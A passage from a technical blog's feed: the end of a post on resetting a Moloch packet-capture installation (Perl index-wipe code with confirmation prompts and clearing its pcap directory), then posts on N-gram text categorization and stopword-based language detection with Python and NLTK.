</pre></td><td class='code'><pre><code class='perl'><span class='line'><span class="k">if</span> <span class="p">(</span><span class="nv">$ARGV</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=~</span><span class="sr"> /(init|wipe)/</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="nv">$ARGV</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="ow">eq</span> <span class="s">&quot;init&quot;</span> <span class="o">&amp;&amp;</span> <span class="nv">$</span><span class="nn">main::</span><span class="nv">versionNumber</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&quot;It appears this elastic search cluster already has moloch installed, this will delete ALL data in elastic search! (It does not delete the pcap files on disk.)\n\n&quot;</span><span class="p">;</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&quot;Type \&quot;INIT\&quot; to continue - do you want to erase everything?\n&quot;</span><span class="p">;</span>
</span><span class='line'>        <span class="n">waitFor</span><span class="p">(</span><span class="s">&quot;INIT&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">elsif</span> <span class="p">(</span><span class="nv">$ARGV</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="ow">eq</span> <span class="s">&quot;wipe&quot;</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&quot;This will delete ALL session data in elastic search! (It does not delete the pcap files on disk or user info.)\n\n&quot;</span><span class="p">;</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&quot;Type \&quot;WIPE\&quot; to continue - do you want to wipe everything?\n&quot;</span><span class="p">;</span>
</span><span class='line'>        <span class="n">waitFor</span><span class="p">(</span><span class="s">&quot;WIPE&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;Erasing\n&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="n">esDelete</span><span class="p">(</span><span class="s">&quot;/tags_v2&quot;</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span><span class='line'>    <span class="n">esDelete</span><span class="p">(</span><span class="s">&quot;/tags&quot;</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span><span class='line'>    <span class="n">esDelete</span><span class="p">(</span><span class="s">&quot;/sequence&quot;</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span><span class='line'>    <span class="n">esDelete</span><span class="p">(</span><span class="s">&quot;/files_v3&quot;</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span><span class='line'>    <span class="n">esDelete</span><span class="p">(</span><span class="s">&quot;/files_v2&quot;</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span><span class='line'>    <span class="n">esDelete</span><span class="p">(</span><span class="s">&quot;/files_v1&quot;</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span><span class='line'>    <span class="n">esDelete</span><span class="p">(</span><span class="s">&quot;/files&quot;</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span><span class='line'>    <span class="n">esDelete</span><span class="p">(</span><span class="s">&quot;/stats&quot;</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span><span class='line'>    <span class="n">esDelete</span><span class="p">(</span><span class="s">&quot;/dstats&quot;</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span><span class='line'>    <span class="n">esDelete</span><span class="p">(</span><span class="s">&quot;/dstats_v1&quot;</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span><span class='line'>    <span class="n">esDelete</span><span class="p">(</span><span class="s">&quot;/sessions*&quot;</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span><span class='line'>    <span class="n">esDelete</span><span class="p">(</span><span class="s">&quot;/template_1&quot;</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="nv">$ARGV</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="ow">eq</span> <span class="s">&quot;init&quot;</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="n">esDelete</span><span class="p">(</span><span class="s">&quot;/users_v1&quot;</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span><span class='line'>        <span class="n">esDelete</span><span class="p">(</span><span class="s">&quot;/users_v2&quot;</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span><span class='line'>        <span class="n">esDelete</span><span class="p">(</span><span class="s">&quot;/users&quot;</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="n">esDelete</span><span class="p">(</span><span class="s">&quot;/tagger&quot;</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="nb">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;Creating\n&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="n">tagsCreate</span><span class="p">();</span>
</span><span class='line'>    <span class="n">sequenceCreate</span><span class="p">();</span>
</span><span class='line'>    <span class="n">filesCreate</span><span class="p">();</span>
</span><span class='line'>    <span class="n">statsCreate</span><span class="p">();</span>
</span><span class='line'>    <span class="n">dstatsCreate</span><span class="p">();</span>
</span><span class='line'>    <span class="n">sessionsUpdate</span><span class="p">();</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="nv">$ARGV</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="ow">eq</span> <span class="s">&quot;init&quot;</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="n">usersCreate</span><span class="p">();</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;Finished.  Have fun!\n&quot;</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<h2>Erasing previously captured pcap data</h2>

<p>Done this only remains to remove pcap data from &#8220;raw&#8221; directory:</p>

<figure class='code'><figcaption><span>erasing moloch pcap data</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>~/moloch/db/raw# rm *
</span></code></pre></td></tr></table></div></figure>


<p>That&#8217;s all folks, enjoy your fresh baked moloch!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[N-Gram-Based Text Categorization: Categorizing text with python]]></title>
    <link href="http://blog.alejandronolla.com/2013/05/20/n-gram-based-text-categorization-categorizing-text-with-python/"/>
    <updated>2013-05-20T20:06:00+02:00</updated>
    <id>http://blog.alejandronolla.com/2013/05/20/n-gram-based-text-categorization-categorizing-text-with-python</id>
    <content type="html"><![CDATA[<h2>Introduction</h2>

<p>As we saw in last post it&#8217;s really easy to detect text language using an analysis of stopwords. Another way to detect language, or when syntax rules are not being followed, is using N-Gram-Based text categorization (useful also for identifying the topic of the text and not just language) as William B. Cavnar and John M. Trenkle <a href="http://blog.alejandronolla.com/images/upload/2013/05/10.1.1.53.9367.pdf">wrote</a> in 1994 so i decided to mess around a bit and did <a href="https://github.com/z0mbiehunt3r/ngrambased-textcategorizer">ngrambased-textcategorizer</a> in python as a proof of concept. <!-- more --></p>

<h2>How N-Gram-Based Text Categorization works</h2>

<p>To perform N-Gram-Based Text Categorization we need to compute N-grams (with N=1 to 5) for each word - and apostrophes - found in the text, doing something like (being the word &#8220;TEXT&#8221;):</p>

<ul>
<li>bi-grams: _T, TE, EX, XT, T_</li>
<li>tri-grams: _TE, TEX, EXT, XT_, T_ _</li>
<li>quad-grams: _TEX, TEXT, EXT_, XT_ _, T_ _ _</li>
</ul>


<p>When every N-Gram has been computed we just keep top 300 - William and John observed this range as proper for language detection and starting around 300 for subject categorization - and save them as a &#8220;text category profile&#8221;. For categorize a text we only have to make same steps and calculate the &#8220;Out-Of-Place&#8221; measure against pre-computed profiles:<br/>
<img src="http://blog.alejandronolla.com/images/upload/2013/05/outofplace_measure.png"></p>

<p>Then, choose the nearest one - the one with lower distance - among them.</p>

<h2>Implementing it in python</h2>

<p>Procedure to create a text category profile is well explained at point &#8220;3.1 Generating N-Gram Frequency Profiles&#8221; and it&#8217;s really easy to implement it in python with the help of powerful <a href="http://nltk.org/index.html">nltk</a> toolkit.</p>

<h3>First step: Split text into tokens (tokenization)</h3>

<p>We need to tokenize text splitting by strings of only letters and apostrophes so we could use nltk <a href="http://nltk.org/api/nltk.tokenize.html?highlight=regexp#module-nltk.tokenize.regexp">RegexpTokenizer</a> for this:</p>

<figure class='code'><figcaption><span>tokenizing by regular expression</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="kn">from</span> <span class="nn">nltk.tokenize</span> <span class="kn">import</span> <span class="n">RegexpTokenizer</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="n">tokenizer</span> <span class="o">=</span> <span class="n">RegexpTokenizer</span><span class="p">(</span><span class="s">&quot;[a-zA-Z&#39;`éèî]+&quot;</span><span class="p">)</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="n">tokenizer</span><span class="o">.</span><span class="n">tokenize</span><span class="p">(</span><span class="s">&quot;Le temps est un grand maître, dit-on, le malheur est qu&#39;il tue ses élèves.&quot;</span><span class="p">)</span>
</span><span class='line'><span class="p">[</span><span class="s">&#39;Le&#39;</span><span class="p">,</span> <span class="s">&#39;temps&#39;</span><span class="p">,</span> <span class="s">&#39;est&#39;</span><span class="p">,</span> <span class="s">&#39;un&#39;</span><span class="p">,</span> <span class="s">&#39;grand&#39;</span><span class="p">,</span> <span class="s">&#39;ma</span><span class="se">\xc3\xae</span><span class="s">tre&#39;</span><span class="p">,</span> <span class="s">&#39;dit&#39;</span><span class="p">,</span> <span class="s">&#39;on&#39;</span><span class="p">,</span> <span class="s">&#39;le&#39;</span><span class="p">,</span> <span class="s">&#39;malheur&#39;</span><span class="p">,</span> <span class="s">&#39;est&#39;</span><span class="p">,</span> <span class="s">&quot;qu&#39;il&quot;</span><span class="p">,</span> <span class="s">&#39;tue&#39;</span><span class="p">,</span> <span class="s">&#39;ses&#39;</span><span class="p">,</span> <span class="s">&#39;</span><span class="se">\xc3\xa9</span><span class="s">l</span><span class="se">\xc3\xa8</span><span class="s">ves&#39;</span><span class="p">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>It&#8217;s just a proof of concept and should be tuned, but will be enough for now.</p>

<h3>Second step: Generating N-grams for each token</h3>

<p>Now it&#8217;s time to generate n-grams (with N=1 to 5) using blank as padding, again nltk has a <a href="http://nltk.org/api/nltk.html?highlight=ngrams#nltk.util.ngrams">function</a> for it:</p>

<figure class='code'><figcaption><span>generating ngrams with nltk</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="kn">from</span> <span class="nn">nltk.util</span> <span class="kn">import</span> <span class="n">ngrams</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="n">generated_ngrams</span> <span class="o">=</span> <span class="n">ngrams</span><span class="p">(</span><span class="s">&#39;TEXT&#39;</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="n">pad_left</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">pad_right</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">pad_symbol</span><span class="o">=</span><span class="s">&#39; &#39;</span><span class="p">)</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="n">generated_ngrams</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span>
</span><span class='line'><span class="p">(</span><span class="s">&#39;E&#39;</span><span class="p">,</span> <span class="s">&#39;X&#39;</span><span class="p">,</span> <span class="s">&#39;T&#39;</span><span class="p">,</span> <span class="s">&#39; &#39;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>ngram function will return a tuple so we need to join positions in ngrams itself:</p>

<figure class='code'><figcaption><span>join splitted char into a ngram</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">generated_ngrams</span><span class="p">[</span><span class="mi">4</span><span class="p">])</span>
</span><span class='line'><span class="s">&#39;EXT &#39;</span>
</span></code></pre></td></tr></table></div></figure>


<h3>Third step: Hashing into a table and countig each N-gram occurrences</h3>

<p>The easiest way to do this is using a python dictionary, doing a sum when ngram has been seen before or creating a new key otherwise:</p>

<figure class='code'><figcaption><span>counting ngrams occurrences</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">ngrams_statistics</span> <span class="o">=</span> <span class="p">{}</span>
</span><span class='line'>
</span><span class='line'><span class="k">for</span> <span class="n">ngram</span> <span class="ow">in</span> <span class="n">ngrams</span><span class="p">:</span>
</span><span class='line'>  <span class="k">if</span> <span class="ow">not</span> <span class="n">ngrams_statistics</span><span class="o">.</span><span class="n">has_key</span><span class="p">(</span><span class="n">ngram</span><span class="p">):</span>
</span><span class='line'>      <span class="n">ngrams_statistics</span><span class="o">.</span><span class="n">update</span><span class="p">({</span><span class="n">ngram</span><span class="p">:</span><span class="mi">1</span><span class="p">})</span>
</span><span class='line'>  <span class="k">else</span><span class="p">:</span>
</span><span class='line'>      <span class="n">ngram_occurrences</span> <span class="o">=</span> <span class="n">ngrams_statistics</span><span class="p">[</span><span class="n">ngram</span><span class="p">]</span>
</span><span class='line'>      <span class="n">ngrams_statistics</span><span class="o">.</span><span class="n">update</span><span class="p">({</span><span class="n">ngram</span><span class="p">:</span><span class="n">ngram_occurrences</span><span class="o">+</span><span class="mi">1</span><span class="p">})</span>
</span></code></pre></td></tr></table></div></figure>


<h3>Fourth step: Sort in reverse order by number of occurrences</h3>

<p>By last, we need to sort previously created dictionary in reverse order based on each ngram occurrences to keep just top 300 most repeated ngrams. Python dict&#8217;s can&#8217;t be sorted, so we need to transform it to a sorted list, we can easily achieve it using operator module:</p>

<figure class='code'><figcaption><span>converting a dictionary to a sorted list</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="n">ngrams_statistics_sorted</span> <span class="o">=</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">ngrams_statistics</span><span class="o">.</span><span class="n">iteritems</span><span class="p">(),</span>\
</span><span class='line'><span class="o">...</span>                             <span class="n">key</span><span class="o">=</span><span class="n">operator</span><span class="o">.</span><span class="n">itemgetter</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span>\
</span><span class='line'><span class="o">...</span>                             <span class="n">reverse</span><span class="o">=</span><span class="bp">True</span><span class="p">)[</span><span class="mi">0</span><span class="p">:</span><span class="mi">300</span><span class="p">]</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="n">ngrams_statistics_sorted</span><span class="p">[</span><span class="mi">80</span><span class="p">:</span><span class="mi">90</span><span class="p">]</span>
</span><span class='line'><span class="p">[(</span><span class="s">&#39;y&#39;</span><span class="p">,</span> <span class="mi">23994</span><span class="p">),</span> <span class="p">(</span><span class="s">&#39;  p&#39;</span><span class="p">,</span> <span class="mi">23941</span><span class="p">),</span> <span class="p">(</span><span class="s">&#39; p&#39;</span><span class="p">,</span> <span class="mi">23941</span><span class="p">),</span> <span class="p">(</span><span class="s">&#39;   p&#39;</span><span class="p">,</span> <span class="mi">23941</span><span class="p">),</span> <span class="p">(</span><span class="s">&#39;    p&#39;</span><span class="p">,</span> <span class="mi">23941</span><span class="p">),</span> <span class="p">(</span><span class="s">&#39;b&#39;</span><span class="p">,</span> <span class="mi">23809</span><span class="p">),</span> <span class="p">(</span><span class="s">&#39;r &#39;</span><span class="p">,</span> <span class="mi">23783</span><span class="p">),</span> <span class="p">(</span><span class="s">&#39;r    &#39;</span><span class="p">,</span> <span class="mi">23783</span><span class="p">),</span> <span class="p">(</span><span class="s">&#39;r   &#39;</span><span class="p">,</span> <span class="mi">23783</span><span class="p">),</span> <span class="p">(</span><span class="s">&#39;r  &#39;</span><span class="p">,</span> <span class="mi">23783</span><span class="p">)]</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now it only remains to save &#8220;ngrams_statistics_sorted&#8221; to a file as a &#8220;text category profile&#8221; or keep just ngrams without occurrences sum when comparing them against others profiles.</p>

<h3>Comparing profiles</h3>

<p>To categorize a text first we need to load pre-computed categories into a list/dict or something similar and, when loaded, walk it and calculate distance with each previously computed profile:</p>

<figure class='code'><figcaption><span>computing ratios for each pre-computed profile</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="k">for</span> <span class="n">language</span><span class="p">,</span> <span class="n">ngrams_statistics</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">_languages_statistics</span><span class="o">.</span><span class="n">iteritems</span><span class="p">():</span>
</span><span class='line'><span class="o">...</span>    <span class="n">language_ngram_statistics</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_calculate_ngram_occurrences</span><span class="p">(</span><span class="n">raw_text</span><span class="p">)</span>
</span><span class='line'><span class="o">...</span>    <span class="n">distance</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_compare_ngram_frequency_profiles</span><span class="p">(</span><span class="n">ngrams_statistics</span><span class="p">,</span> <span class="n">language_ngram_statistics</span><span class="p">)</span>
</span><span class='line'><span class="o">...</span>    <span class="n">languages_ratios</span><span class="o">.</span><span class="n">update</span><span class="p">({</span><span class="n">language</span><span class="p">:</span><span class="n">distance</span><span class="p">})</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span>   
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="n">languages_ratios</span>
</span><span class='line'><span class="p">{</span><span class="s">&#39;spanish&#39;</span><span class="p">:</span> <span class="mi">39960</span><span class="p">,</span> <span class="s">&#39;french&#39;</span><span class="p">:</span> <span class="mi">40398</span><span class="p">,</span> <span class="s">&#39;english&#39;</span><span class="p">:</span> <span class="mi">40418</span><span class="p">}</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="c"># extracting the one with lowest distance</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="nb">min</span><span class="p">(</span><span class="n">languages_ratios</span><span class="p">,</span> <span class="n">key</span><span class="o">=</span><span class="n">languages_ratios</span><span class="o">.</span><span class="n">get</span><span class="p">)</span>
</span><span class='line'><span class="s">&#39;spanish&#39;</span>
</span></code></pre></td></tr></table></div></figure>


<h2>Conclusions</h2>

<p>N-Gram-Based text categorization is probably not the &#8220;state-of-art&#8221; in text categorization - almost ten years old and a bit simple compared with newer ways of categorizing text - but it could be useful in some situations and as a basis to build upon and, what the heck, i learned doing it and had great time, so it totally worth it to me ;)</p>

<p>See you soon!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Detecting text language with python and NLTK]]></title>
    <link href="http://blog.alejandronolla.com/2013/05/15/detecting-text-language-with-python-and-nltk/"/>
    <updated>2013-05-15T13:40:00+02:00</updated>
    <id>http://blog.alejandronolla.com/2013/05/15/detecting-text-language-with-python-and-nltk</id>
    <content type="html"><![CDATA[<h2>Introduction</h2>

<p>Most of us are used to Internet search engines and social networks capabilities to show only data in certain language, for example, showing only results written in Spanish or English. To achieve that, indexed text must have been analized previously to &#8220;guess&#8221; the languange and store it together.</p>

<p>There are several ways to do that; probably the most easy to do is a stopwords based approach. The term &#8220;stopword&#8221; is used in natural language processing to refer words which should be filtered out from text before doing any kind of processing, commonly because this words are little or nothing usefult at all when analyzing text. <!-- more --></p>

<h2>How to do that?</h2>

<p>Ok, so we have a text whose language we want to detect depending on stopwords being used in such text. First step is to &#8220;tokenize&#8221; - convert given text to a list of &#8220;words&#8221; or &#8220;tokens&#8221; - using an approach or another depending on our requeriments: should we keep contractions or, otherwise, should we split them? we need puntuactions or want to split them off? and so on.</p>

<p>In this case we are going to split all punctuations into separate tokens:</p>

<figure class='code'><figcaption><span>nltk &#8220;wordpunct_tokenize&#8221; tokenizer</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="kn">from</span> <span class="nn">nltk</span> <span class="kn">import</span> <span class="n">wordpunct_tokenize</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="n">wordpunct_tokenize</span><span class="p">(</span><span class="s">&quot;That&#39;s thirty minutes away. I&#39;ll be there in ten.&quot;</span><span class="p">)</span>
</span><span class='line'><span class="p">[</span><span class="s">&#39;That&#39;</span><span class="p">,</span> <span class="s">&quot;&#39;&quot;</span><span class="p">,</span> <span class="s">&#39;s&#39;</span><span class="p">,</span> <span class="s">&#39;thirty&#39;</span><span class="p">,</span> <span class="s">&#39;minutes&#39;</span><span class="p">,</span> <span class="s">&#39;away&#39;</span><span class="p">,</span> <span class="s">&#39;.&#39;</span><span class="p">,</span> <span class="s">&#39;I&#39;</span><span class="p">,</span> <span class="s">&quot;&#39;&quot;</span><span class="p">,</span> <span class="s">&#39;ll&#39;</span><span class="p">,</span> <span class="s">&#39;be&#39;</span><span class="p">,</span> <span class="s">&#39;there&#39;</span><span class="p">,</span> <span class="s">&#39;in&#39;</span><span class="p">,</span> <span class="s">&#39;ten&#39;</span><span class="p">,</span> <span class="s">&#39;.&#39;</span><span class="p">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>As shown, the famous quote from Mr. Wolf has been splitted and now we have &#8220;clean&#8221; words to match against stopwords list.</p>

<p>At this point we need stopwords for several languages and here is when <a href="http://nltk.org/index.html">NLTK</a> comes to handy:</p>

<figure class='code'><figcaption><span>included languages in NLTK</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="kn">from</span> <span class="nn">nltk.corpus</span> <span class="kn">import</span> <span class="n">stopwords</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="n">stopwords</span><span class="o">.</span><span class="n">fileids</span><span class="p">()</span>
</span><span class='line'><span class="p">[</span><span class="s">&#39;danish&#39;</span><span class="p">,</span> <span class="s">&#39;dutch&#39;</span><span class="p">,</span> <span class="s">&#39;english&#39;</span><span class="p">,</span> <span class="s">&#39;finnish&#39;</span><span class="p">,</span> <span class="s">&#39;french&#39;</span><span class="p">,</span> <span class="s">&#39;german&#39;</span><span class="p">,</span> <span class="s">&#39;hungarian&#39;</span><span class="p">,</span> <span class="s">&#39;italian&#39;</span><span class="p">,</span> <span class="s">&#39;norwegian&#39;</span><span class="p">,</span> <span class="s">&#39;portuguese&#39;</span><span class="p">,</span> <span class="s">&#39;russian&#39;</span><span class="p">,</span> <span class="s">&#39;spanish&#39;</span><span class="p">,</span> <span class="s">&#39;swedish&#39;</span><span class="p">,</span> <span class="s">&#39;turkish&#39;</span><span class="p">]</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="n">stopwords</span><span class="o">.</span><span class="n">words</span><span class="p">(</span><span class="s">&#39;english&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">:</span><span class="mi">10</span><span class="p">]</span>
</span><span class='line'><span class="p">[</span><span class="s">&#39;i&#39;</span><span class="p">,</span> <span class="s">&#39;me&#39;</span><span class="p">,</span> <span class="s">&#39;my&#39;</span><span class="p">,</span> <span class="s">&#39;myself&#39;</span><span class="p">,</span> <span class="s">&#39;we&#39;</span><span class="p">,</span> <span class="s">&#39;our&#39;</span><span class="p">,</span> <span class="s">&#39;ours&#39;</span><span class="p">,</span> <span class="s">&#39;ourselves&#39;</span><span class="p">,</span> <span class="s">&#39;you&#39;</span><span class="p">,</span> <span class="s">&#39;your&#39;</span><span class="p">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now we need to compute language probability depending on which stopwords are used:</p>

<figure class='code'><figcaption><span>calculate languages ratios</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="n">languages_ratios</span> <span class="o">=</span> <span class="p">{}</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="n">tokens</span> <span class="o">=</span> <span class="n">wordpunct_tokenize</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="n">words</span> <span class="o">=</span> <span class="p">[</span><span class="n">word</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="k">for</span> <span class="n">word</span> <span class="ow">in</span> <span class="n">tokens</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="k">for</span> <span class="n">language</span> <span class="ow">in</span> <span class="n">stopwords</span><span class="o">.</span><span class="n">fileids</span><span class="p">():</span>
</span><span class='line'><span class="o">...</span>    <span class="n">stopwords_set</span> <span class="o">=</span> <span class="nb">set</span><span class="p">(</span><span class="n">stopwords</span><span class="o">.</span><span class="n">words</span><span class="p">(</span><span class="n">language</span><span class="p">))</span>
</span><span class='line'><span class="o">...</span>    <span class="n">words_set</span> <span class="o">=</span> <span class="nb">set</span><span class="p">(</span><span class="n">words</span><span class="p">)</span>
</span><span class='line'><span class="o">...</span>    <span class="n">common_elements</span> <span class="o">=</span> <span class="n">words_set</span><span class="o">.</span><span class="n">intersection</span><span class="p">(</span><span class="n">stopwords_set</span><span class="p">)</span>
</span><span class='line'><span class="o">...</span>
</span><span class='line'><span class="o">...</span>    <span class="n">languages_ratios</span><span class="p">[</span><span class="n">language</span><span class="p">]</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">common_elements</span><span class="p">)</span> <span class="c"># language &quot;score&quot;</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="n">languages_ratios</span>
</span><span class='line'><span class="p">{</span><span class="s">&#39;swedish&#39;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="s">&#39;danish&#39;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="s">&#39;hungarian&#39;</span><span class="p">:</span> <span class="mi">2</span><span class="p">,</span> <span class="s">&#39;finnish&#39;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#39;portuguese&#39;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#39;german&#39;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="s">&#39;dutch&#39;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="s">&#39;french&#39;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="s">&#39;spanish&#39;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#39;norwegian&#39;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="s">&#39;english&#39;</span><span class="p">:</span> <span class="mi">6</span><span class="p">,</span> <span class="s">&#39;russian&#39;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#39;turkish&#39;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#39;italian&#39;</span><span class="p">:</span> <span class="mi">2</span><span class="p">}</span>
